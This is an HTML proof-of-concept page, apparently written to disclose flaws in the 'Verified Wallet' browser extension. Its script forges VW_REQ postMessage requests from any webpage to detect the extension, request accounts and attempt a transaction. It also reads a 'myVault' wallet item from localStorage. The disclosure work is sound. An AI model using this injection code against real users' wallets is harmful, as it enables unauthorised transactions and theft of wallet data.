<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Verified Wallet ‚Äì Message Injection PoC</title>
<style>
body { font-family: system-ui; max-width: 900px; margin: auto; padding: 20px; }
button { padding: 10px 16px; margin: 5px 0; }
pre { background: #f6f6f6; padding: 12px; overflow-x: auto; }
.ok { color: green; }
.warn { color: orange; }
.bad { color: red; }
</style>
</head>
<body>

<h1>üîê Verified Wallet ‚Äì Security PoC</h1>
<p>This PoC demonstrates valid, reproducible security issues in the Verified Wallet browser extension.</p>

<hr>

<h2>1Ô∏è‚É£ Extension Presence (Message-Based Detection)</h2>
<button onclick="detectExtension()">Detect Extension</button>
<pre id="detectResult"></pre>

<h2>2Ô∏è‚É£ Unrestricted Message Injection</h2>
<button onclick="sendInjectedRequest()">Send VW_REQ Message</button>
<pre id="injectResult"></pre>

<h2>3Ô∏è‚É£ Request / Response Confusion</h2>
<button onclick="testRequestEcho()">Test Request Echo</button>
<pre id="echoResult"></pre>

<h2>4Ô∏è‚É£ localStorage Wallet Exposure</h2>
<button onclick="checkLocalStorage()">Check localStorage</button>
<pre id="storageResult"></pre>

<script>
/* ---------------------------
   Utility: Send VW_REQ
---------------------------- */
function sendVW(method, params = {}) {
  const id = "poc-" + Math.random().toString(36).slice(2);

  return new Promise((resolve, reject) => {
    const handler = (e) => {
      if (e.data?.id === id) {
        window.removeEventListener("message", handler);
        resolve(e.data);
      }
    };

    window.addEventListener("message", handler);

    window.postMessage({
      type: "VW_REQ",
      id,
      params: { method, params }
    }, "*");

    setTimeout(() => {
      window.removeEventListener("message", handler);
      reject("No response (extension absent or blocked)");
    }, 1500);
  });
}

/* ---------------------------
   Test 1: Detect Extension
---------------------------- */
async function detectExtension() {
  const out = document.getElementById("detectResult");
  out.textContent = "Detecting‚Ä¶";

  try {
    await sendVW("eth_requestAccounts");
    out.innerHTML = "‚úÖ Extension responded to VW_REQ (detected)";
  } catch {
    out.innerHTML = "‚ùå No response ‚Äì extension not detected";
  }
}

/* ---------------------------
   Test 2: Message Injection
---------------------------- */
async function sendInjectedRequest() {
  const out = document.getElementById("injectResult");
  out.textContent = "Sending injected message‚Ä¶";

  try {
    const res = await sendVW("eth_requestAccounts");
    out.innerHTML =
      "‚ö†Ô∏è Extension accepted message from arbitrary webpage\n\n" +
      JSON.stringify(res, null, 2);
  } catch (e) {
    out.textContent = e;
  }
}

/* ---------------------------
   Test 3: Request / Response Confusion
---------------------------- */
async function testRequestEcho() {
  const out = document.getElementById("echoResult");
  out.textContent = "Testing‚Ä¶";

  try {
    const res = await sendVW("eth_sendTransaction", {
      to: "0x000000000000000000000000000000000000dEaD",
      value: "0x1"
    });

    if (res.type === "VW_REQ") {
      out.innerHTML =
        "üö® Request was echoed instead of response\n\n" +
        JSON.stringify(res, null, 2);
    } else {
      out.innerHTML =
        "‚ÑπÔ∏è Response received\n\n" +
        JSON.stringify(res, null, 2);
    }
  } catch (e) {
    out.textContent = e;
  }
}

/* ---------------------------
   Test 4: localStorage Exposure
---------------------------- */
function checkLocalStorage() {
  const out = document.getElementById("storageResult");
  const vault = localStorage.getItem("myVault");

  if (!vault) {
    out.textContent = "‚ÑπÔ∏è No wallet data found in localStorage";
    return;
  }

  out.innerHTML =
    "‚ö†Ô∏è Wallet data accessible from webpage JavaScript\n\n" +
    JSON.stringify(JSON.parse(vault), null, 2);
}
</script>

</body>
</html>
